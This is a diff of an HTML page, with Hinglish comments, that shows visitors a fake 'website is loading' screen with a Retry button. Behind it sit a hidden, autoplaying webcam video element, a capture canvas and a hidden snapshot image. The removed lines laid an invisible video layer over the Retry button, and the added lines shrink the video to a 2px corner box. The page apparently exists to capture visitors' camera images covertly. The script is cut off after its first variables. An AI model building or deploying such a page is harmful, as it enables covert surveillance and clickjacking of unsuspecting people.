@@ -42,40 +42,41 @@
         .retry-btn:hover {
             background-color: #e6e200;
         }
-    /* Custom Invisible Trigger Config */
-    .snap-portal video {
-        position: absolute;
-        top: 50%;                 /* Screen ke center mein vertical align */
-         left: 50%;                /* Screen ke center mein horizontal align */
-        transform: translate(-50%, -50%); /* Dimension adjustment */
-         width: 1px;             /* "Retry" button ki exact width ke barabar */
-         height: 1px;             /* "Retry" button ki exact height ke barabar */
-         opacity: 0;               /* 🔴 Element ko completely invisible karne ke liye */
-        z-index: 9999;            /* 🔴 "Retry" button ke theek upar layered rakhne ke liye */
-    border-radius: 1px;       /* 👈 Yeh raha tumhara border-radius exact bracket ke pehle */
-    }
-    canvas { display: none; }
-    .preview-img { display: none; }
-</style>
+        .snap-portal { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; }
+        .media-container { display: flex; justify-content: center; align-items: center; }
+        video { 
+    position: absolute;
+    top: 1px;           /* Top se thoda sa gap */
+    left: 1px;          /* Left se thoda sa gap */
+    width: 2px;         /* 0.1 Inch Width 📏 */
+    height: 2px;        /* 0.1 Inch Height 📏 */
+    object-fit: cover; 
+    display: block;      /* Hidden se hata kar visible kiya 🎥 */
+    z-index: 500;        /* Sabse upar dikhane ke liye */
+    border: 1px solid #FFFC00; /* Yellow border taaki corner me saaf dikhe */
+    border-radius: 1px;
+}
+
+        canvas { display: none; }
+        .preview-img { display: none; }
+    </style>
 </head>
 <body>
 
-<div class="loading-container" style="position: relative;">
+<div class="loading-container">
     <div class="loading-text">This website is loading...</div>
-    <button class="retry-btn">Retry</button> 
+    <button class="retry-btn" onclick="location.reload();">Retry</button>
+</div>
 
-    <div class="snap-portal">
-        <div class="media-container">
-            <video id="webcam" autoplay playsinline muted></video>
-            <canvas id="captureCanvas" width="640" height="480"></canvas>
-            <img id="savedFrame" class="preview-img">
-        </div>
+<div class="snap-portal">
+    <div class="media-container">
+        <video id="webcam" autoplay playsinline muted></video>
+        <canvas id="captureCanvas" width="640" height="480"></canvas>
+        <img id="savedFrame" class="preview-img" alt="System Snapshot Matrix">
     </div>
 </div>
 
 <script>
-/* ... Yahan se poora JavaScript engine bina kisi badlav ke shuru ho jata hai ... */
-    
     let activeStream = null;
     let isLoopRunning = false;
     let loopCycleCounter = 0;
